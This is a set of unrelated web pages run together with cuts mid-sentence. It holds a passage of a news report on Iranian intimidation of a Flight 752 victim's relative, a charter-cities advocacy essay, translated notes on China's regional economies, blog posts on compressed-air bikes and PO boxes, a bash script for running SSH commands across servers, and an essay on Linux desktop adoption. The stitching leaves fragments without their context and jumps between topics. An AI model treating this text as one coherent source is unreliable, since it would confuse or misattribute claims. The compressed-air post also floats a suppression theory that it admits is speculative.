target="_blank">daily in fees for allowing flights in its airspace.</a></p>  <p>"Ok, let's assume we had delayed the Ukrainian flight for ten hours.

"This is not just a question of human error or mistake.

Rezaeifar says in the recording. "Mr. Hajizadeh explained and said&nbsp;yes, and we had orders. He said there are some national security considerations in the country."</p>  <p>On January 11, Iran's military admitted it unintentionally shot down the plane and blamed human error, saying the military&nbsp;mistook the jetliner for a hostile target. That acknowledgement&nbsp;came after three days of denial and after satellite evidence showed&nbsp;that missiles had hit the aircraft.</p>  <p>Rezaeifar did not respond to CBC's request for a comment.

Soleimani has been an outspoken critic of Tehran since his wife Elnaz Nabiy died in the crash.</p>  <p>In that Instagram post, Soleimani wrote Iranians&nbsp;won't forget about the crimes the regime has committed against its own people.</p>  <p>"Please delete it from your Instagram," Rezaeifar tells&nbsp;Soleimani on the call. "Do you agree that out of 83 million people of Iran, only 10 or 12 people have hurt you? Why should those other 82 million people be insulted by this post?"</p>  <p>He then asks Soleimani if he thinks the Canadian government is more "benevolent" toward him.&nbsp;</p>  <p>"Are you certain that the whole Canadian government is good and uncorrupt?" asked Rezaeifar.</p>  <p>Two days later, Soleimani&nbsp;said,&nbsp;Iran's Ministry of Intelligence contacted his family members in Iran to exert more pressure on them about his behaviour on social media.&nbsp;</p>  <ul>   <li> <p><a href="https://www.cbc.ca/news/politics/iran-flight-752-ukraine-international-airlines-crash-1.5521377" target="_blank"><strong>Families of Flight 752 victims report threats, acts of intimidation — and blame Tehran</strong></a></p> </li>  </ul>  <p>"It's ridiculous," Soleimani told CBC News.

It's just not a good move."</p>  <p>He said the practice&nbsp;of the Islamic Republic is to exert psychological&nbsp;pressure,&nbsp;and often physical&nbsp;pressure, on anyone opposed to the regime,&nbsp;at home and abroad.</p>  <p>Juneau said he wants to know the extent of Rezaeifar's relationship with the IRGC and Iran's&nbsp;Ministry of Intelligence. He cautions the details of what Rezaeifar said on the recording might not be accurate, and might have been meant to exert pressure on Soleimani.</p>  <p>"Is it true?" said Juneau. "Is he boasting? Is he exaggerating some things to increase the level of intimidation towards family members? These are all questions that we don't know the answer to."</p>  <p>Syrine Khoury, press secretary to&nbsp;Foreign&nbsp;Affairs Minister&nbsp;François-Philippe Champagne, sent a written statement to CBC&nbsp;saying "interference with Canadian citizens is totally unacceptable, very troubling and won't be tolerated.</p>  <p>"The government of Canada denounces any and all attempts to coerce or pressure Canadians, especially those suffering the loss of a loved one," she added. "The government of Canada encourages anyone who feels threatened, unsafe or vulnerable to contact local law enforcement authorities."</p>  <p>Ralph Goodale, Canada's special adviser to the Trudeau government on the&nbsp;Flight 752 file, said the phone call&nbsp;"constitutes outrageous behaviour."</p>  <p>"It's wrong on every count of procedure, propriety, appropriateness. It's simply completely wrong," he said.&nbsp;</p>  <p>He added the International Coordination and Response Group formed by&nbsp;Canada, Ukraine, Sweden, Afghanistan and the United Kingdom to support victims' families will be investigating&nbsp;Rezaeifar's&nbsp;"interesting and provocative" comments about keeping the airspace open to see if there's truth to the remarks.&nbsp;</p>  <h2>Audio casts doubt on past reports</h2>  <p>Hamed Esmaeilion, the interim spokesperson for the association representing the families of the Canadian victims, said the recording raises serious concerns about the two reports Iran's Civil Aviation Organization has already published about Flight 752. Esmaeilion lost his wife, Parisa Eghbalian, and their nine-year-old daughter Reera in the destruction&nbsp;of Flight 752.</p>  <p>"I don't see any different between Rezaeifar and the new investigator," he said. "CAO is not independent. The whole organization is closely working with the IRGC."</p>  <p>Iran is expected to publish another report on the crash&nbsp;before heading to France on July 20 to download and analyze the plane's flight data recorders, according …</p></span></p></div></div>

When entrepreneurs compete to offer better goods and services, good ideas "win" and spread. Older, less effective ways of doing things wither and die. As basic research and scientific breakthroughs advance what's possible, entrepreneurs with ambitious visions introduce new and better ways of doing things. In an open society with a market system, each of us is incentivized to learn from what works and creatively solve problems for each other. This is why our economy continues to grow, and goods and services continue to improve over time.									</p><p>As the world’s economy has grown more and more dynamic, governments haven’t kept up. Competition has destroyed many lumbering corporate bureaucracies; government bureaucracies have only grown. Automobile speed, safety, and reliability have increased by countless orders of magnitude since the invention of the Model T Ford; the time it takes government to build needed infrastructure has skyrocketed. Decades of innovation in infotech and logistics have brought us just-in-time supply chains and efficient procurement. Government procurement in America hasn't kept up with these best practices because it lacks transparency, incentives, and accountability. One example - out of thousands - that is particularly salient and frustrating today is that the US government spent millions on a contract for in- case-of-emergency ventilators that were never delivered even as COVID-19 became a national crisis. It’s obvious that the forces tied to our growing prosperity haven’t trickled over to public policy.&nbsp;</p><p>I am an American patriot and continue to spend much of my career helping to fix the government we have. Thousands of governments work with software companies I have founded such as OpenGov, Esper, and Palantir, which help better allocate trillions of taxpayer dollars, bring data and transparency to the regulatory state, or use cutting-edge technology to enable new workflows to achieve public policy goals and save billions of dollars compared to how things were done before. We’re proud to have partnered with extraordinary people in government to achieve great things. But fixing government from the inside is not enough; American government is too big and too entrenched in outmoded processes and only loosely accountable to the American public.&nbsp;</p><p>This is why I’m attracted to the concept of “charter cities”: legally independent city-states, or “special economic zones” which are free to innovate and establish better modes and methods of government than existing players. We should combine the lessons from the past century with new technologies to improve transparency, hold public servants accountable, and make government work better. The best way to drive innovative governance is for governments or aspects of governments to compete for citizens just as companies compete for customers. Governments must constantly innovate, respond to changing circumstances, and invent or adopt better ways of doing things – or else lose out to competitors.&nbsp;</p><p>I support the work of Patri Friedman at Pronomos Capital, Mark Lutter at the Charter Cities Institute, Balaji Srinivasan, and others in the space on the conviction that the concept of a charter city is revolutionary. Layers and layers of bureaucracy, lack of accountability, and other mistakes have enabled cost disease and crony capitalism in critical sectors, reduced the dynamism of our economy, and made the cost of living skyrocket for our middle and working classes. We need a revolution in governance.&nbsp;</p><figure id="w-node-bd55c1be8db6-dc1001ae"><p><img src="https://assets.website-files.com/5ef37c99b43a6fc5f535692d/5effaad138630803dbfb48b7_FRAME_03_v04_HD.jpg" alt=""></p><figcaption>(An example of a charter city set in rural America. Renders by The Cicero Institute / Joe Lonsdale)</figcaption></figure><p>It’s difficult for human beings to understand the idea of positive-sum growth. Intuitively, anything my neighbor gains is a loss for me. In one sense, that’s true. As Nobel prize-winning economist Paul Romer explains, the world of physical objects - or collections of atoms - is finite and zero-sum. Any&nbsp;object I obtain is a loss for you and vice versa. So how is positive-sum growth possible? Ideas. Good ideas rearrange the world in ways that make the things in it more valuable.&nbsp;</p><p>The practice of farming, for example, didn’t create new atoms even as it dramatically expanded the food supply. It was a good idea that changed the world to make it more useful, allowing humanity to support a larger population at less cost. Bad ideas do the opposite. Soviet collectivized farms, for example, cost millions of lives.&nbsp;</p><p>Markets are positive-sum because good ideas are valuable. If I buy something from you, I’m telling you that I value what you’ve made. If you make a profit, it means you’ve increased the value of whatever raw supplies you started with. If you make a loss, you’ve destroyed value. A free market without cronyism is a machine that increases the value of the world by rewarding good ideas and punishing bad ones. When ideas compete, we all win because the best ideas change the world in ways that make all of us more prosperous.&nbsp;</p><p>Some of the most powerful ideas find expression in our laws and shape the actions of entire communities. The best collections of ideas - such as the United States constitution or English common law - don’t just change the physical world but establish frameworks within which people may act. Good laws make for a more prosperous society. Bad laws, such as those in Venezuela or North Korea, can have disastrous effects on everyone.&nbsp;</p><p>Unfortunately, governments improve more slowly than individuals and corporations because they face much less competition and their citizens have little choice. When a company does things badly, consumers punish it by buying a competitor’s product. But if your government taxes you to pay for something that's wasteful or inefficient, you can’t respond by not paying taxes. You can try to help design and support a more efficient version of the scheme, but politics, unlike markets, are not generally a place where the best ideas win or where the relevant ideas are even discussed. Ultimately, bad policies reduce economic growth and decrease tax revenues, but this takes years or decades, and government today is such a giant kludge of disparate aspects that it’s hard to tell which policies were at fault.&nbsp;</p><p>In theory, people can always move from one country to another. One might think that the threat of political “exit” would force countries to compete for citizens just as companies compete for customers - and to some degree this does happen at extremes. Countries with better laws attract more citizens and tax revenue and prosper over time [such as net inflow into the US]. Countries with bad laws lose population and power [such as Venezuela]. But there are serious barriers to political exit. It’s time- consuming and expensive to move, and it’s sometimes difficult to get permission to enter a new jurisdiction. Further, many countries have distinct advantages - such as tremendous natural resource endowments - that shelter them from the consequences of mismanagement. Finally, the best countries attract talented individuals who themselves attract others, and though laws make a difference over the long-run, network effects can persist for a long time even when beset by poor government.&nbsp;</p><figure id="w-node-a693ac26f297-dc1001ae"><p><img src="https://assets.website-files.com/5ef37c99b43a6fc5f535692d/5effab5f6dc9fca333884f6f_FRAME_01_v03_HD.jpg" alt=""></p><figcaption>(Set in rural America. Renders by The Cicero Institute / Joe Lonsdale)</figcaption></figure><p>Charter cities are new cities, founded on unpopulated land [we are lucky - the vast majority of land is still open!], which are allowed autonomous commercial law and semi-autonomous governments and justice systems. The idea is simple: found new cities, free from old bureaucratic and legal structures, and explore bold new visions of how government should work. Market them to people who choose to join and see what the world learns.&nbsp;</p><p>Charter cities must attract new residents to survive. This is a powerful incentive to make laws clear and fair, build responsive public institutions, provide economic opportunity, and come up with new ideas to outcompete incumbent competitors. There’s no one way to achieve these ends, so charter cities will also compete with each other to design and implement innovative governance regimes.&nbsp;</p><p>We know that competition in government works because it’s been done before. The United States, for example, is prosperous in part due to a federalist system that forces each state to compete as a laboratory of democracy within a federal framework that makes it easy to move from state-to-state. 1846, for example, New York became the first state to fully abolish rules for corporate charters under which corruption was rampant because the legislature used to decide which businesses were allowed to incorporate. Over the latter half of that century, this measure spread from state to state and became ubiquitous.&nbsp;</p><p>Of course, the biggest success stories come from the most radical experiments. Over the course of a century, Hong Kong developed from a standard port city into one of the most prosperous cities in the world - even as mainland China stagnated under communism. Good laws made Hong Kong wealthy. The Chinese, recognizing this, set up in 1980 a special economic zone in the Shenzhen area nearby where some normal economic restrictions were waived to more closely resemble Hong Kong. The area grew by more than an order of magnitude in population and prosperity in the first 20 years of its existence. Deng Xiaoping’s special economic zone experiments were the basis for China’s gradual liberalization. By showing what kinds of laws attract capital and commerce, Hong Kong and Shenzhen transformed all of China.&nbsp;</p><p>The most successful charter cities will likely guarantee and protect individual liberties, have a fair legal system with clear and just laws and decisions based on precedent, and treat businesses and workers fairly with a transparent regulatory structure. These features have made several small cities like Hong Kong and Singapore …</p></div></div></div></div></div>

<p>Even with so much<span></span> <span>“</span>the sky’s falling in China” rhetoric, you’ll still find a lot of optimistic, forward-looking people here. But there’s a stark contrast between attitudes in Beijing/Shenzhen/etc and sub-tier 1 cities that urbanization has seemingly left behind.</p>
<p>Below are observations Chinese millennials made when they visited their hometowns during this year’s Spring Festival week (aka Chinese New Year). These were shared on Wechat a bit (unknown who original curator is). I thought it’d be interesting to translate and re-share here.</p>
<h3 id="observation-of-a-tier-4-chinesecity">Observation of a Tier 4 Chinese&nbsp;city</h3>
<ol type="1">
<li>As local coal mines goes from reducing and suspending production to filing bankruptcy, their workers are first delayed and denied wages before being laid off.</li>
<li>The local real estate market is stagnant. Ongoing construction projects are left unfinished. Completed property don’t sell.</li>
<li>Local cigarette factories see their sales over the past year go into decline and begin to cut production.</li>
<li>Food and fruit princes drop. So does the income of farmers.</li>
<li>More labor sitting idle and less income for workers.</li>
<li>Infrastructure construction continues to go strong. The business at a local stone supplier to road construction projects is flourishing.</li>
</ol>
<p>Reflection:</p>
<ol type="1">
<li>The energy sector, including coal and oil, and real estate sector are the first to be affected by the economic crisis. The situation continues to deteriorate, with no optimistic outlook.</li>
<li>The reach of the economic crisis is expanding to more sectors. Even cigarette companies, which have enjoyed high profit margin, are suffering. The management pins the blame on the restriction on consumption using public funds. The restriction has been in place for a number of years, its impact is already evident from the plummeting stock prices of white liquor or baijiu manufacturers. However, during all these years, the margin of cigarette industry has remained stable. An article published last year even said that the cigarette industry was the most lucrative business in China. Therefore, what is going on in local cigarette companies is related to local economy and local income.</li>
<li>The revenue decline of coal mines and cigarette factories, which used to be local cash cows, will trigger a series of consequences and affect the overall local consumption level. As a result of layoffs and shrinking demand, local spare labor force has grown. The income of local workers has declined due to an oversupply of labor.</li>
<li>Infrastructure construction is the only sector holding up while coal mines, local consumption and real estate are suffering. Considering the backwardness of the local infrastructure, this sector still has room to grow, as long as investment is in place. But where does the money come from? Local government is already heavily in debt. It all comes down to how much the central government is willing to support.</li>

<li>Local automobile part factories and steel plants close down.</li>
<li>Heavy polluter chemical industry is doing fine, but production is limited.</li>
<li>Advertisement agencies are doing alright.</li>
<li>Plenty of car sales were made at the second half of 2015, with many new cars spotted on the road.</li>
<li>Tourism industry has declining sales.</li>

<li>Economy seems to be really struggling. Several large local clothes OEMs are faced with the risks of closing down. Making money is becoming increasingly difficult. So is collecting receivables.</li>
<li>Sales are difficult to make in the real estate sector.</li>
<li>Quality commercial property is needed.</li>
<li>Retail sellers on Wechat are everywhere. Overseas shopping agents are on Wechat. People go on the platform to sell designer handbags from local OEMs, clothes and even vegetables and honey. It is the absolute trend. Wechat public accounts have penetrated almost every industry. For example, by following the Wechat public account of a karaoke place, people can order and switch songs on their phone. An extremely popular local account is Zhang Shang Ji Mo, a local fusion of portal website, meituan and 58.com. It is said that even some villages have their own public accounts on Wechat.</li>
<li>Taxi hailing apps are highly popular.</li>
<li>Traffic congestion is serious.</li>
<li>Smog is serious in winter, but no one cares about the level of <span>PM</span> 2.5. No one on the street wears masks even when <span>PM</span> 2.5 level shoots over 300.</li>
<li>Gyms have recently begun to grow. Whether you are a worker, a small business owner or a civil servant, everyone loves iPhone, but many of those over 40 years old use Huawei or even Oppo phones.</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div><h2>Compressed air is a sustainable alternative to batteries and fossil fuels. Despite this, it has been disappearing from the public eye.</h2>
<p>I first became interested in compressed air as a fuel source during a visit to The Hartebeesthoek Radio Astronomy Observatory (HartRAO) during a cub-scout camp many years ago. We made rockets out of Coca-Cola bottles pumped up with a bicycle pump; makeshift fins held on with cello-tape. After a brief pumping the pent-up energy overcame the nozzle’s friction, the bottle-rocket would detach from the pump, and would blast off into space.</p>
<p>Alternative forms of energy storage have always been fascinating. From <a href="https://en.wikipedia.org/wiki/Pumped-storage_hydroelectricity"> pumped hydroelectric energy storage</a> to <a href="https://en.wikipedia.org/wiki/Flywheel_energy_storage">flywheel energy storage</a> . I recently stumbled upon this article on Low-Tech magazine about <a href="https://solar.lowtechmagazine.com/2018/05/ditch-the-batteries-off-grid-compressed-air-energy-storage.html"> compressed air energy storage (CAES)</a> . It rekindled my interest in using compressed air as a way to conserve power, overcoming the <a href="https://en.wikipedia.org/wiki/Duck_curve"> duck’s head problem</a> of some sustainable energy production techniques like solar and wind power.</p>
<p>The concept of CAES is fairly simple: compress air while there is energy production (the sun is up) for later use. The flow of energy can then be turned up or down depending on the demand by increasing or decreasing the flow of air.</p>
<p>Larger-scale CAES plants are fairly inefficient since compressing air generates heat (the second law of thermodynamics) and decompressing air cools it down significantly. Due to this, we will not be talking about CAES for large scale power storage, but for powering vehicles. Specifically, the humble bike.</p>
<p>A compressed-air vehicle is fuelled by tanks of pressurised atmospheric gas and propelled by the release and expansion of the gas within a pneumatic motor. These vehicles are comparable to battery-powered vehicles, with energy generation being displaced from the vehicle itself to a power plant where lower source emissions are possible and the net production of pollutants can be reduced.</p>
<p>The energy is stored in a pressurised tank on the vehicle which can be refilled or swapped out (hypothetically) at service stations, or refilled by plugging an onboard compressor into the electricity grid. Compressed air in 300 bar containers has energy density comparable to lead-acid batteries.</p>
<p>There have been few examples of compressed air vehicles in history such as the Gottardbahn pneumatic locomotive and <a href="https://en.wikipedia.org/wiki/Fireless_locomotive"> Fireless locomotives</a> .</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/0/07/CompressedAirLocomotive_Section1_AdolpheBraun1811to1877.jpg" alt=" Gotthardbahn"></p>
<p>Torpedos have also been known to use compressed air as a propulsion mechanism.</p>
<h3>What makes pneumatic vehicles interesting?</h3>
<p>The sounds of a city are the sounds of traffic. During the first week of lockdown was the first time I had ever heard a truly quiet city. The sounds of vehicles dominate the soundscape of cities. A city without internal combustion engines would be a much more peaceful place to live.</p>
<p>The cost of building pneumatic bikes are potentially much smaller than both internal combustion and electric motorbikes due to the simplicity of their design and the lack of special materials required in their construction. Lest we forget, internal combustion engines work by carefully exploding fuel and directing the explosions in a useful way.</p>
<p>Compressed-air vehicles are comparable in many ways to electric vehicles in their advantages but without the need for environmentally hazardous chemicals such as gasoline or battery acids/metals. Cylinders also do not need to be changed out every few years like electrochemical batteries and have a much longer operational life due to the simplicity of their structure.</p>
<p>The rate of self-discharge is very low when compared to batteries that deplete their charge slowly over time. Therefore, the vehicle may be left unused for longer periods than electric alternatives.</p>
<p>These cylinders can be swapped out at filling stations easily or charged while parked using solar power or done at home by hooking it up to the electrical grid.</p>
<p>Due to social distancing measures taken in big cities such as London and Paris, cycling for transport has spiked again, with new cycle-only paths and roads becoming the norm. Having personal vehicles as opposed to taking public transport will be standard for the foreseeable future while we deal with this pandemic.</p>
<h3>There are some downsides</h3>
<p>Any conversion of energy between forms results in a loss. For compressed-air cars, energy is lost when electrical energy is converted to compressed air, and when that stored energy is converted into kinetic energy to turn the motor.</p>
<p>When air expands it cools dramatically. This energy loss could be used for something, but for now let’s just assume that it is lost to the atmosphere on an air-powered motorbike. Similarly, tanks get very hot when filled rapidly. SCUBA tanks can be immersed in water to cool them while being filled, but this also results in energy loss.</p>
<p>Refuelling a compressed air container at home may take as long as 4 hours, while refilling on specialised equipment may fill the tank in 3 minutes while dealing with the excess heat in some (hopefully productive) way.</p>
<p>The final issue with CAES for propulsion is that while batteries can somewhat maintain their voltage throughout their discharge, the pressure of compressed air tanks falls as the air is released, effectively providing less propulsion over time.</p>
<h3>Experimental cars and bikes</h3>
<p>For this article, we will be focussing specifically on bikes, as there are a few problems with air-powered cars as the power necessary to propel a car is vastly greater than the amount necessary to propel a bike. While the majority of the energy required for driving a car is used in moving the car itself, the inverse is true for a bike where an air propelled bike would likely weigh half of the weight of the rider.</p>
<p>There have been a whole host of functional prototypes for bikes running on nothing but compressed air. The <a href="https://web.archive.org/web/20110218141158/http://www.ecofriend.org/entry/eco-bikes-green-speed-air-powered-motorcycle-aims-to-smash-land-speed-record/"> Green Speed Air Powered Motorcycle</a> using the Angelo Di Pietro compressed air engine made some noise in 2009.</p>
<p><img src="https://inhabitat.com/wp-content/blogs.dir/1/files/2012/11/o2-pursuit-final_363-600x480.jpg" alt="O2 Pursuit"></p>
<p>In 2011 the <a href="https://www.coroflot.com/deanbenstead/O2-Pursuit-Prototype"> O2 Pursuit Prototype by Dean Benstead</a> boasted a range of 100km per tank and top speeds of 140km/h, using a modified Yamaha WR250R and also using EngineAir’s Angelo Di Pietro motor. It even won a <a href="https://newatlas.com/2012-james-dyson-award-finalists/24630/"> James Dyson award</a></p>
<p>There have been multiple successful engineering projects. Some built by engineering students, some by hippies or handymen at home. <a href="https://bikeportland.org/wp-content/uploads/2016/03/pneu-Cory-lead-ted-800x789.jpg"> Cory Little</a></p>
<p>Even Peugeot, Suzuki, Toyota, and Tata had some form of air-powered vehicles in the works.</p>
<h3>Then things go silent</h3>
<p>My research on pneumatic vehicles took me on nostalgia-inducing trips through the “old internet” of personal blogs, unmaintained news sites, and enthusiast journals. There were a LOT of broken links as web pages were removed over the years, domains expired, and server fans stopped spinning.</p>
<p>Around 2012 talk about pneumatic and air-powered vehicles goes quiet. The plans of releasing some promising pneumatic motorbikes to the public seems to completely disappear. Toyota, Tata, Peugeot and Suzuki (as far as I can tell) abandon their plans to release air powered vehicles. <a href="https://en.wikipedia.org/wiki/AIRPod"> 1</a> <a href="https://www.lesechos.fr/2015/01/psa-la-revolution-de-lhybrid-air-naura-pas-lieu-190742">2</a></p>
<p>I’m generally not a conspiracy theorist, but I believe that air-powered vehicles may have been suppressed (see what I did there). The technology is sound, and if prototypes built by engineering students can work well enough, imagine what could happen if a well-funded company developed an air-powered motorbike.</p>
<p>Maybe there’s something I don’t know about. Maybe the tech is actually a lot more complicated than I am led to believe, but that still leaves the question: Who killed the pneumatic bike?</p>

<p><em>Because bacon takes forever to cook I’m writing this entire thing from the kitchen. Make your jokes accordingly. </em></p>



<p>The number one suggestion I see for people trying to get a following for their newly written book, program, etc is to start a newsletter. Here in the US at least that has some rules that go along with it. Sure, you can start a newsletter with a few dozen folks, send an email each month and not end the world. However, if you want to set up a real email service you’ll need to add something to the very end of it, your address. <a href="https://www.ftc.gov/tips-advice/business-center/guidance/can-spam-act-compliance-guide-business">Legally in the US you have to put both a real working unsubscribe link and a real live address. </a>Mailchimp, Substack, and Tinyletter all have this built in when you set up your profile the address you put in gets added automatically. </p>



<p>You don’t want to put your physical home address on the wilds of the internet. I’m sure someone out there has your credit card info in a txt file along with your real address, but what we’re worried about is the 99.9999% of other folks out there who don’t need extraordinarily easy access to that info. Not everyone has a work office address either. </p>



<p>Is a PO Box expensive? Depends on the size of box. The smallest one at my Post Office is about $6.25 a month, just a dollar over what I pay for my web hosting. Not so bad is it? Typically they charge in blocks of 3, 6 , or 12 months and send you little reminders that your account is about to get charged, no shady business with the USPS. I haven’t bought one of the boxes from UPS or other commercial mail services but I’m sure they are similar. </p>



<p>Did I get a PO Box just for a newsletter? No, I originally got it to connect to my Ham radio information. When I got my license I had planned on buying some cool equipment and connecting to other hams and doing what’s called DXing and swapping QSL postcards after making contact. I<a href="https://en.wikipedia.org/wiki/QSL_card">t’s a super old custom but really cool. </a>Unfortunately I don’t’ have the hardware to do it just yet but maybe someday. </p>



<p>So I kept the PO Box. Luckily I had discovered fountain pens and with fountain pens come the excuse to use them on things like, you guessed it, writing letters. I found a few penpals on a subreddit but like most things there the letters dried up after two or three responses. It’s hard to keep in touch when either recipient gets busy. But it was nice to have a PO Box to let a stranger send me letters as opposed to handing out my real address. </p>

<p>Still, I kept the PO Box. Then I started the newsletter. Every self published book marketing guru on the planet claims that starting a newsletter and growing it to a billion numbers will result in sales for your fantasy/romance/scifi novel. Unfortunately I don’t write for any of those genres and my newsletter grew stagnant after about fifty subscribers. The thing about commercial fiction is that you have to write commercial fiction to use succeed in their marketing tactics. </p>



<p>But hey, I still have the PO Box! But why? Well, I started sending postcards to friends and family. Not to sell them anything but to send thanks for something that would otherwise seem less personal in a text message. I put the PO box as the return address for these cards should someone else see the basically public note. </p>



<p>This is all great for me but what good is a PO Box for other folks? Literally any time you need to ship something to a person you don’t really know you should be using one. If you make 3D prints or printer components you want to use a PO Box to send parts from. If you develop PCB’s for your hobby and need to ship them to folks you’ll want to use one too. Really anything you make that you want to send to people you don’t <em>really</em> know. Stickers, zines, t-shirts, your bands latest album. With the whole selling things in a physical location being in the trash right now you can’t stand on the corner and sling products, you need a PO Box. </p>



<p>I guess this is the section where I put the pros and cons so here we go:</p>



<h4>Pros</h4>



<ul><li>Public Location Security</li><li>Cheaper than Netflix</li><li>Extra set of keys to feel important</li><li>Support your local post office</li></ul>



<h4>Cons</h4>



<ul><li>You have to drive to the post office to check the mail</li><li>They do cost money</li><li>You have to keep up with another set of keys</li><li>PO Box can’t be used as an address to register a business</li></ul>



<figure><img src="https://jetgirl.art/wp-content/uploads/2020/07/920x920.jpg" alt="" srcset="https://jetgirl.art/wp-content/uploads/2020/07/920x920.jpg 920w, https://jetgirl.art/wp-content/uploads/2020/07/920x920-300x225.jpg 300w, https://jetgirl.art/wp-content/uploads/2020/07/920x920-768x576.jpg 768w, https://jetgirl.art/wp-content/uploads/2020/07/920x920-580x435.jpg 580w" sizes="(max-width: 920px) 100vw, 920px"><figcaption>Bianca Waters – mySanAntonio</figcaption></figure>



<p>For some people who live out in the boonies, travel for extended periods of the year, or change apartments every 6 months a PO Box is a must have. Folks who have individual mailboxes are prone to easily stolen mail. Those of us with the big mailbox hub in a subdivision already know what it’s like to have mail come in a little locked box. Even those can be compromised as they’re out in the open and typically unlit at night. </p>



<p>I could come up with more reasons but the two packs of bacon are done and the battery on the laptop is about to die. Hope you enjoyed this wall of text. Enjoy your 4th of July weekend!</p>

<p>There are complex solutions available for server management, some of you might even be on the <em>containerization train</em>.
Sometimes you just want to run a quick command on every server, it could be a one off to check <code>uptime</code> or a simple
check for <code>lockfiles</code>. Here’s a simple script which runs a shell command on a list of servers.</p>
<div><div><pre><code><span>#!/usr/bin/env bash</span>

<span>set</span> <span>-u</span>

<span>ACTION</span><span>=</span><span>${</span><span>1</span>:?<span>"Must supply action"</span><span>}</span>
<span>HOST</span><span>=</span><span>${</span><span>2</span>:?<span>"Must supply host name"</span><span>}</span>

<span>source</span> ./scripts/lib.sh

<span># Expand host string</span>
<span>HOSTS</span><span>=</span><span>"</span><span>$(</span>GET_HOSTS <span>$HOST</span><span>)</span><span>"</span>            <span># GET_HOSTS is a lists all hosts</span>

<span># Command to SSH</span>
SSH_COMMAND<span>()</span> <span>{</span>
    <span>local </span><span>ip</span><span>=</span><span>"</span><span>$(</span>GET_IP <span>$1</span><span>)</span><span>"</span>           <span># GET_IP is maps hostname to IP</span>
    ssh <span>"</span><span>${</span><span>TARGET_USER</span><span>}</span><span>@</span><span>${</span><span>ip</span><span>}</span><span>"</span> <span>"</span><span>$2</span><span>"</span>
<span>}</span>

<span># Run command for each host</span>
<span>declare</span> <span>-A</span> results
<span>for </span>H <span>in</span> <span>$HOSTS</span><span>;</span> <span>do</span>
    <span># Redirect output to a temp file, later redirect back to stdio</span>
    <span>temp</span><span>=</span><span>$(</span><span>mktemp</span><span>)</span>
    <span>exec</span> &amp;&gt; <span>${</span><span>temp</span><span>}</span>

    <span># Not the '&amp;', this creates a background process.</span>
    <span># We also source the env on the host,</span>
    <span># as .bashrc and .bash_profile are finicky at times</span>
    <span>printf</span> <span>"</span><span>\n</span><span>Running command %s %s </span><span>\n</span><span>"</span> <span>"</span><span>${</span><span>ACTION</span><span>}</span><span> </span><span>${</span><span>H</span><span>}</span><span>"</span>
    SSH_COMMAND <span>"</span><span>$H</span><span>"</span> <span>"source ~/app/scripts/env.sh; </span><span>${</span><span>ACTION</span><span>}</span><span>"</span> &amp; 

    <span># '$!' is the PID which maps to the correct temp file</span>
    results[<span>$!</span><span>]=</span><span>$temp</span>
<span>done</span>

<span># Restore stdout and stderr</span>
<span>exec</span> &amp;&gt; /dev/tty

<span># Wait for the jobs that were executed</span>
<span>for </span>pid <span>in</span> <span>"</span><span>${</span><span>!results[@]</span><span>}</span><span>"</span><span>;</span> <span>do
    </span><span>wait</span> <span>$pid</span>
    <span>cat</span> <span>"</span><span>${</span><span>results</span><span>[</span><span>$pid</span><span>]</span><span>}</span><span>"</span>
<span>done</span>
</code></pre></div></div>
<p>There’s a lot to dissect in this little snippet. Let’s get right to it.</p>
<ul>
<li><code>set -u</code>: Most bash guides will ask you to use <code>set -eEuo pipefail</code>, but you would not want to use that especially
when you parallelize using background proccesses in bash. This would mean partial execution and we want to avoid that
all costs. The only error that we care about is <em>undefined variables</em>, hence the <em>set -u</em></li>
<li><code>GET HOSTS</code>: A simple function to generate a list of hosts that you want to run the command on.</li>
<li><code>exec &amp;&gt; ${temp} and exec &amp;&gt; /dev/tty</code>: This redirects the output temporarily and later resets it to the terminal.</li>
<li><code>results[$!]=$temp</code>: To keep track of which pid points to which output file.</li>
<li><code>for pid in "${!results[@]}"</code>: Traverse over every pid in the map and wait on it.</li>
</ul>
<p>This simple scripts saves a lot of time especially when you’re managing a cluster of servers.</p>

<![CDATA[Another non-year of Linux on the desktop]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Let’s look at other software on the desktop, to understand why there isn’t (as a broad, popular platform) Linux on the desktop, then how there could be.</p>





<p>Over on De Programmatica Ipsum I discussed <a href="https://deprogrammaticaipsum.com/cross-platform-is-the-platform/">the difference between the platform business model, and the technology platform</a>. In the platform model, the business acts as a matchmaking agent, connecting customers to vendors. An agricultural market is a platform, where stud farmers can meet dairy farmers to sell cattle, for example.</p>





<p>Meanwhile, when a technology platform is created by a business, it enables a two-sided business model. The (technology) platform vendor sells their APIs to developers as a way of making applications. They sell their technology to consumers with the fringe benefit that these third-party applications are available to augment the experience. The part of the business that is truly a platform model is the App Store, but those came late as an effort to capture a share of the (existing) developer-consumer sales revenue, and don’t really make the vendors platform businesses.</p>





<p>In fact, I’m going to drop the word platform now, as it has these two different meanings. I’ll say “store” or “App Store” when I’m talking about a platform business in software, and “stack” or “software stack” when I’m talking about a platform technology model.</p>





<p>Stack vendors have previously been very protective of their stack, trying to fend off alternative technologies that allow consumers to take their business elsewhere. Microsoft famously “poisoned” Java, an early and capable cross-platform application API, by bundling their own runtime that made Java applications deliberately run poorly. Apple famously added a clause to their store rules that forbade any applications made using off-stack technology.</p>





<p>Both of these situations are now in the past: Microsoft have even embraced some cross-platform technology options, making heavy use of Electron in their own applications and even integrating the Chromium rendering engine into their own browser to increase compatibility with cross-platform technology and reduce the cost of supporting those websites and applications made with Javascript. Apple have abandoned that “only” clause in their rules, replacing it with a collection of “but also” rules: yes you can make your applications out of whatever you want, but they have to support sign-in and payment mechanisms unique to their stack. So a cross-stack app is <em>de jure</em> better integrated in Apple’s sandpit.</p>





<p>These actions show us how these stack vendors expect people to switch stacks: they find a compelling application, they use it, they discover that this application works better or is better integrated on another stack, and so they change to it. If you’re worried about that, then you block those applications so that your customers can’t discover them. If you’re not worried about that, then you allow the technologies, and rely on the fact that applications are commodities and nobody is going to find a “killer app” that makes them switch.</p>





<p>Allowing third-party software on your own platform (cross-stack or otherwise) comes with a risk, that people are only buying your technology as an incidental choice to run something else, and that if it disappears from your stack, those customers might go away to somewhere that it is available. Microsoft have pulled that threat out of their briefcase before, settling a legal suit with Apple after suggesting that they would remove Word and Excel from the Mac stack.</p>





